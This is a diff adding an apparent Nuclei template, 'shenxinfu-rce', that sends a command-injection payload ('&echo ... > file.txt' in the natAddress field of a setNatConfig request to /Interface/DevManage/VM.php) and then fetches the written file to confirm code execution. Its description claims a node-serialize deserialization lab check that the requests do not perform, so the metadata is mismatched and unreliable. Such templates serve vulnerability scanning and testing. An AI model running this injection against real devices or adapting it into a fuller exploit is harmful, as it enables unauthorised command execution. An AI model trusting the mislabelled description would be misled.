@@ -1,0 +1,38 @@
+id: shenxinfu-rce
+
+info:
+  name: node-serialize <= 0.0.4 - Local Lab Detection (no OAST)
+  author: kylew1004
+  severity: critical
+  description: |
+    Local lab check for node-serialize <= 0.0.4 at /api/deserialize.
+    It sends an IIFE payload and expects the lab app to return {"ok":true}.
+  tags: yushi
+variables:
+  rand_string: "{{to_lower(rand_base(5))}}"
+  rand_value: "{{to_lower(rand_text_alpha(5))}}"
+http:
+  - raw:
+      - |
+        POST /Interface/DevManage/VM.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+
+        cmd=setNatConfig&natAddress=%26echo%20{{rand_value}}%20>{{rand_string}}.txt
+      - |
+        GET /Interface/DevManage/{{rand_string}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - 'contains(body_2,"{{rand_value}}")'
+        condition: and
+
